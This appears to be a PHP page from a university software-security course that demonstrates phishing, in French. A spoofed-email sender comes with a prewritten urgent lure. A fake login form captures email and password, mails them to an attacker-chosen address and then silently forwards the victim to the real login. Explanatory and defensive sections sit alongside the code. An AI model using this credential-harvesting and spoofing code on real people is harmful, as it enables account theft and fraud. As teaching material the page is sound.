<?php
/*****************************************************
 * phishing.php                                      *
 *                                                   *
 * Project : Session project                         *
 * Course : GLO-7009 - Software security             *
 * Team : Team 2                                     *
 * Session : Winter 2024                             *
 * University : Laval University                     *
 * Version : 1.0                                     *
 *****************************************************/

/*****************************************************
 *                     MODEL                         *
 *****************************************************/
require("model.php");

/*****************************************************
 *                 PHISHING CODE                     *
 *****************************************************/
if($_SERVER["REQUEST_METHOD"] == "POST") {
    $failRedirect= $config["site_link"] . "/" . 
    $menu[2]["folder"] . "/" . 
    $menu[2]["files"][1]["name"] . 
    "?view=demonstration";
    $messageEnvoiVuln = "
    <html>
        <body>
            <table>
            <tbody>
                    <tr>
                        <td style=\"border:1px solid black; 
                                    padding: 0px; 0.5rem\">
                            Adresse courriel
                        </td>
                        <td style=\"border:1px solid black; 
                                    padding: 0px; 0.5rem\">
                                    ".$_POST["emailv"]."
                        </td>
                    </tr>
                    <tr>
                        <td style=\"border:1px solid black; 
                                    padding: 0px; 0.5rem\">
                                    Mot de passe
                        </td>
                        <td style=\"border:1px solid black; 
                                    padding: 0px; 0.5rem\">
                            ".$_POST["passwordv"]."
                        </td>
                    </tr>
                    ".(isset($_POST["persistentv"]) ? "
                    <tr>
                        <td style=\"border:1px solid black; 
                                    padding: 0px; 0.5rem\">
                            Persistence
                        </td>
                        <td style=\"border:1px solid black; 
                                    padding: 0px; 0.5rem\">
                            ".$_POST["persistentv"]."
                        </td>
                    </tr>
                    ":"")."
                </tbody>
            </table>
        </body>
    </html>";
    $pattern_link = "/<a\s+[^>]*href=\"([^\"]*)\"[^>]*>/";
    if (isset($_POST["sendMail"])
        ) {
            $error = array();
            if (isset($_POST["emailAttack"])) {
                if (!filter_var($_POST["emailAttack"], FILTER_VALIDATE_EMAIL)) {
                    $error["emailAttack"] = "Veuillez insérer une adresse ". 
                    "courriel valide.";
                };
            } else {
                $error["emailAttack"] = "Veuillez insérer une adresse courriel";
            }
            if (isset($_POST["emailVict"])) {
                if (!filter_var($_POST["emailVict"], FILTER_VALIDATE_EMAIL)) {
                    $error["emailVict"] = "Veuillez entrer une adresse de ".
                    "transmission valide.";
                    $error["mailSendVuln"] = $error["emailVict"];
                }
            } else {
                $error["emailVict"] = "Veuillez entrer une adresse de ".
                "transmission.";
                $error["mailSendVuln"] = $error["emailVict"];
            }
            if (isset($_POST["emailSubject"])) {
                if (empty($_POST["emailSubject"])) {
                    $error["emailSubject"] = "Veuillez entrer un sujet au ".
                    "message.";
                };
            } else {
                $error["emailSubject"] = "Veuillez entrer un sujet au message.";
            }
            if (isset($_POST["emailAttackName"])) {
                if (empty($_POST["emailAttackName"])) {
                    $error["emailAttackName"] = "Veuillez entrer un nom qui ".
                    "affiché à l'utilisateur.";
                }
            } else {
                $error["emailAttackName"] = "Veuillez entrer un nom qui sera ".
                "affiché à l'utilisateur.";
            }
            if (isset($_POST["emailMessage"])) {
                if (empty($_POST["emailMessage"])) {
                    $error["emailMessage"] = "Veuillez entrer un message au ".
                    "courriel.";
                }
            } else {
                $error["emailMessage"] = "Veuillez entrer un message au ".
                "courriel.";
            }
            if (!isset($error["emailMessage"])) {
            $message = $_POST["emailMessage"];
                if (preg_match($pattern_link, $message, $resultMatch)) {
                    $resultMatch =
                        "<a href=\"".$resultMatch[1]."&attackEmail=".
                            $_POST["emailAttack"]."\">";
                    $message = preg_replace($pattern_link, $resultMatch, 
                    $message);
                }
            }
            if (!isset($error["emailMessage"]) && !isset($error["emailAttack"])
            && !isset($error["emailAttackName"])&& !isset($error["emailVict"]) 
            && !isset($error["emailSubject"]) && 
            !isset($error["emailMessage"])) {
                $ret = sendmail($_POST["emailAttackName"],$_POST["emailAttack"], 
                    $_POST["emailVict"], $_POST["emailSubject"], 
                    $_POST["emailMessage"], $_POST["emailMessageType"],
                    $failRedirect);
            }
        }
        else if (isset($_POST["connect"])) {
            header("Location: ". $config["site_link"] . "/" . $menu[2]["folder"]
            ."/".$menu[2]["files"][0]["name"]."?view=demonstration");
            exit;
        }
        else if (isset($_POST["connectVuln"])) {
            $error = array();
            if (isset($_POST["emailv"])) {
                if (!filter_var($_POST["emailv"], FILTER_VALIDATE_EMAIL)) {
                   $error["email"] = "Veuillez entrer une adresse courriel 
                   valide.";
                }
            } else {
                $error["emailv"] = "Veuillez entrer une adresse courriel.";
            }
    
            if (!isset($_POST["passwordv"]) || (isset($_POST["passwordv"]) && 
                        empty($_POST["passwordv"]))) {
                $error["password"] = "Veuillez entrer un mot de passe.";
            }
            if (!isset($_POST["mailSendVuln"]) || 
                empty($_POST["mailSendVuln"])) {
                $error["mailSendVuln"] = "Veuillez entrer une adresse de ".
                    "transmission.";
            }
            if (!isset($error["email"]) && !isset($error["password"]) &&
                !isset($error["mailSendVuln"])) {
                $req = sendmail("Phishing Result","Result",
                $_POST["mailSendVuln"]??"","Résultat de l'attaque", 
                $messageEnvoiVuln, "html", $failRedirect);
                if ($req) {
                    $email = $_POST["emailv"];
                    $password = $_POST["passwordv"];
                    $persistent = isset($_POST["persistentv"]);
                    echo "
                    <script>
                    window.addEventListener(\"DOMContentLoaded\", () => {
                        document.getElementById(\"formVulnTransmit\").submit();
                    });
                    </script>";
                }
            }
        }
}


/*****************************************************
 *                    CONTENT                        *
 *****************************************************/
$presentation = '<div class="table">
    <div class="row split">
        <section>
            <h2>Catégorie</h2>
            <p>Authentification par phishing</p>
        </section>
        <section>
            <h2>Impact potentiel</h2>
            <p>Confidentialité et intégrité</p>
        </section>
    </div>
    <section class="row">
        <h2>Description</h2>
        <p>L’authentification par phishing consiste à se faire passer pour une 
            autorité dans le but de récupérer des informations sensibles. 
            L’attaque peut prendre différentes formes, telles que les adresses 
            courriels, les SMS, les publicités, etc. L’attaquant va tenter de 
            créer un sentiment d’urgence chez la victime enfin de la pousser à 
            agir.</p>
    </section>
    <section class="row">
        <h2>Objectifs</h2>
        <ul class="list">
            <li>Contourner les mesures d’authentification.</li>
            <li>Voler des données sensibles ou confidentielles.</li>
        </ul>
    </section>
    <section class="row">
        <h2>Causes</h2>
        <ul class="list">
            <li>L’attaquant a accès aux adresses courriel.</li>
        </ul>
    </section>
    <section class="row">
        <h2>Exemples marquants</h2>
        <ul class="list">
            <li><strong>
            <a href="https://nvd.nist.gov/vuln/detail/CVE-2023-28069">
            Dell Streaming Data Platform (CVE-2023-28069)
            </a></strong><br />
            Une vulnérabilité dans la plateforme de flux continu des données de 
            Dell a permis à un attaquant d’inciter un utilisateur légitime à 
            cliquer sur un lien malicieux. Cet attaquant a pu réaliser son 
            attaque sans être connecté sur la plateforme. Cette attaque est 
            possible sur toutes les versions 1.4 et les précédentes.
            </li>
            <li><strong>
            <a href=" https://nvd.nist.gov/vuln/detail/CVE-2021-29432">
            Sydent (CVE-2021-29432)
            </a></strong><br />
            La compagnie Matrix est une compagnie qui œuvre pour un monde 
            sécurisé de communication décentralisé et un réseau open-source. 
            Une vulnérabilité dans leur serveur d’identité Sydent pouvait être 
            utilisée pour transmettre des courriels arbitraires à toutes les 
            adresses.
            </li>
        </ul>
    </section>
</div>';

$demonstration = '<div class="split">
    <form method="POST" hidden id="formVulnTransmit"
        action="cookies.php?view=demonstration">
        <div>
        <div class="form-group">
        <input type="email" class="form-control" 
        name="email" id="email" value="'.$email.'"/>
        </div>
        <div class="form-group">
        <input type="password" class="form-control" 
            name="password" id="password" 
            value="'.$password.'"/>
        </div>
            <div class="form-group">
            <input type="checkbox" class="form-check" name="persistent" 
            id="persistent"
        '.(isset($_POST["persistentv"]) ? 'checked': '').' />
        </div>
        <div class="form-group">
            <input type="text" name="connect" value="connect"
            class="form-control" />
        </div>
        </div>
        <div>
        ' . ((isset($_COOKIE["userToken"]) && 
        is_logged_in($_COOKIE["userToken"])) ? '
            <button name="disconnect" type="submit" value="disconnect">
                Déconnexion</button>
            ' : '
            <button name="connected" type="submit" value="connected">
                Connexion</button>
            ') . '
        </div>
    </form>
    <form id="formVuln" method="POST">
        <div>
            <h2>Scénario</h2>
            ' . ((isset($_COOKIE["userToken"]) && 
                is_logged_in($_COOKIE["userToken"])) ? '
            <p style="color: green;">L\'usager est connecté.</p>' : '
            <div class="form-group">
                ' . ((isset($error["token"])) ? '<div class="alert">' . 
                    $error["token"] . '</div>' : '') . '
            </div>
            <div class="form-group">
                <label for="emailv">Adresse email :</label>
                ' . ((isset($error["email"])) ? '<div class="alert">' . 
                    $error["email"] . '</div>' : '') . '
                <input id="emailv" class="form-control' . 
                    ((isset($error["email"])) ? ' invalid' : '') . 
                    '" name="emailv" type="email"' . ((isset($error["email"])) 
                    ? ' value="' . $_POST["email"] . '"' : '') . ' />
            </div>
            <div class="form-group">
                <label for="passwordv">Mot de passe :</label>
                ' . ((isset($error["password"])) ? '<div class="alert">' . 
                    $error["password"] . '</div>' : '') . '
                <input id="passwordv" class="form-control' . 
                    ((isset($error["password"])) ? ' invalid' : '') . 
                        '" name="passwordv" type="password" />
            </div>
            <div class="form-group">
                <input id="persistentv" class="form-check" name="persistentv" 
                    type="checkbox" />
                <label for="persistentv">Se souvenir de moi</label>
            </div>
            <div class="form-group">
                <label for="mailSendVuln">Adresse courriel de réception
                    </label>
                ' . ((isset($error["email"])) ? '<div class="alert">' . 
                    $error["email"] . '</div>' : '') . '
                <input id="mailSendVuln" placeholder="Placer ici l\'adresse'.
                ' courriel de réception" class="form-control"' . 
                    ((isset($error["mailSendVuln"])) ? ' invalid' : '') . 
                    ' name="mailSendVuln" type="email"' . 
                    ((!isset($error["mailSendVuln"])) 
                    ? ' value="' . $_POST["mailSendVuln"] . '"' : '') . ' />
            </div>
            <div>
            </div>
            ') . '
        </div>
        <footer>
            ' . ((isset($_COOKIE["userToken"]) && 
                is_logged_in($_COOKIE["userToken"])) ? '
            <button name="disconnect" type="submit" value="disconnect">
                Déconnexion</button>
            ' : '
            <button name="connectVuln" type="submit" value="connectVuln">
                Connexion</button>
            ') . '
        </footer>
    </form>
    <form method="POST">
        <div>
            <h2>Configuration</h2>
            <div class="form-group">
                <label for="emailAttackName">Nom affiché dans le courriel
                </label>'. ((isset($error["emailAttackName"]))? 
                    '<div class="alert">'. $error["emailAttackName"].
                    '</div>' : '').'
                <input id="emailAttackName" type="text" class="form-control"
                    name="emailAttackName"/>
            </div>
            <div class="form-group">
                <label for="emailAttack">Adresse courriel affiché
                </label>'.((isset($error["emailAttack"]))?'
                <div class="alert">'.$error["emailAttack"].'
                </div>':'')
                .'
                <input id="emailAttack" class="form-control" name="emailAttack" 
                    type="email"/>
            </div>
            <div class="form-group">
                <label for="emailVict">Adresse courriel de réception</label>
                '.((isset($error["emailVict"]))?'<div class="alert">'.
                    $error["emailVict"]
                .'</div>':'').'
                <input id="emailVict" class="form-control" name="emailVict" 
                    type="email" 
                    placeholder="Placer ici l\'adresse courriel de réception."/>
            </div>
            <div class="form-group">
                <label for="emailMessageType">Type de message</label>
                    <select id="emailMessageType" class="form-control" 
                    name="emailMessageType">
                        <option value="html">HTML</option>
                        <option value="raw">Brute</option>
                    </select>
            </div>
            <div class="form-group">
                <label for="emailSubject">Sujet du courriel</label>
                '.((isset($error["emailSubject"]))?'<div class="alert">'.
                    $error["emailSubject"]
                    .'</div>':'').'
                <input id="emailSubject" class="form-control" 
                    name="emailSubject" type="text" 
                    value="Ne perdez-pas votre accès!" />
            </div>
            <div class="form-group">
                <label for="emailMessage">Message du courriel</label>
                '.((isset($error["emailMessage"]))?'<div class="alert">'.
                    $error["emailMessage"]
                .'</div>':'').'
                <textarea id="emailMessage" class="form-control" 
                    name="emailMessage" placeholder="<html></html> OU \'\'">
                    <html><body>Bonjour cher utilisateur,<br />
                    Nous avons constaté que vous n\'avez pas utilisé
                    votre compte depuis les dernières 24 heures. Si vous ne
                     cliquer pas <a href="'.$config["site_link"] . "/" . 
                     $menu[2]["folder"] . "/". $menu[2]["files"][1]["name"] . 
                     "?view=demonstration".'">
                     ici</a> avant les prochaines 24 heures, votre compte sera 
                     supprimé.
                     </body>
                    </html>
                    </textarea>
            </div>
        </div>
        <footer>
            <button name="sendMail" type="submit" value="sendMail">
                Envoyer le courriel
            </button>
        </footer>
    </form>
</div>';

$exploit = '<div>
    <section>
        <h2>Conditions préalables pour l’exploitation</h2>
        <ul class="list">
            <li>L’attaquant détient une liste d’adresses courriels.</li>
            <li>L’attaquant a extrait la page de connexion du site web.</li>
        </ul>
    </section>
    <section>
        <h2>Méthodes d\'exploitation</h2>
        <ul class="list">
            <li>Envoyer un lien malicieux par courriel.</li>
            <li>Envoyer un lien malicieux par SMS.</li>
        </ul>
    </section>
    <section>
        <h2>Exécution de l\'attaque</h2>
        <ul class="list">
            <li>Concevoir un site malicieux imitant le site cible.</li>
            <li>Transmettre le lien aux victimes.</li>
            <li>Patienter jusqu’à ce qu’au moins une victime clique sur le 
            lien.</li>
            <li>Récupérer les informations de connexion.</li>
            <li>Rediriger la victime vers le site cible.</li>
        </ul>
    </section>
    <section>
        <h2>Analyse du code vulnérable</h2>
        <p>Pour expliquer cette attaque, nous allons parcourir les démarches 
        d’exploitation étape par étape.</p>
        <p>Premièrement, l’attaquant commence par récupérer la page de connexion
         d’un site cible et modifier la structure pour s’envoyer un courriel 
         détenant les informations de connexion.</p>
        <p>Deuxièmement, l’attaquant va créer un courriel qui imite l’autorité 
        afin de viser un groupe de victimes avec des adresses courriels qu’il 
        aurait récupérés précédemment. Lorsqu’il a terminé de rédiger son 
        courriel, l’attaquant va le transmettre au groupe et attendre une action
         de leur part. Les utilisateurs qui ne se méfient pas seront piégés, car
          ils fourniront leurs informations d’identifications.
        </p>
        <p>
        Enfin, l’attaque se termine lorsque l’attaquant utilise les informations
         des utilisateurs à leur insu.
        </p>
    </section>
</div>';

$fix = '<div>
    <section>
        <h2>Mesures de protection</h2>
        <p>On peut se prémunir de cette attaque en mettant en place différentes 
        mesures :</p>
        <ul class="list">
            <li><strong>Vérifier la provenance des courriels</strong><br />
            Les utilisateurs peuvent vérifier la provenance des courriels qu’ils
             reçoivent en regardant le nom inscrit dans ces courriels. Si 
             toutefois celui-ci ne permet pas de distinguer le vrai courriel de 
             celui de l’attaquant, il faudra regarder la source du message. De 
             plus, les courriels malveillants en provenance de l’attaquant 
             contiennent souvent des termes génériques ou des fautes 
             d’orthographes d’usage. Les pistes mentionnées précédemment 
             devraient accroître la vigilance concernant la provenance des 
             courriels frauduleux.
            </li>
            <li><strong>Vérifier la provenance du lien</strong><br />
            Le lien ne devrait pas déformer le nom du site. Si ce dernier 
            correspond au nom de domaine du site visé, il est peu probable qu’il
             s’agisse d’une attaque. Dans le cas contraire, les utilisateurs 
             devraient s’en méfier.
            </li>
            <li><strong>Éviter de cliquer sur des liens</strong><br />
            Les utilisateurs devraient se méfier des liens et de la nature du 
            message provenant de courriels non sollicités, dont particulièrement
             ceux qui poussent à agir dans l’urgence. Les utilisateurs vigilants
              sont plus enclins à vérifier l’authenticité d’un message.
            </li>
        </ul>
    </section>
</div>';

/*****************************************************
 *                    RENDER PAGE                    *
 *****************************************************/
echo render_malicious("Authentification par hameçonnage", $presentation, 
    $demonstration, $exploit, $fix);
echo "<script>
    let emailReceptFormSend=document.getElementsByName(\"mailSendVuln\")[0];
    
    let emailRecept=document.getElementsByName(\"emailVict\")[0];
    if (emailRecept) {
        emailRecept.addEventListener(\"change\", 
        function () { 
            if (emailReceptFormSend.value) {
                emailReceptFormSend.value=emailRecept.value
            }
        },false);
        emailReceptFormSend.addEventListener(\"change\",
        function() {
            if (emailRecept.value) {
                emailRecept.value=emailReceptFormSend.value
            }
        },false);
    }    
</script>";
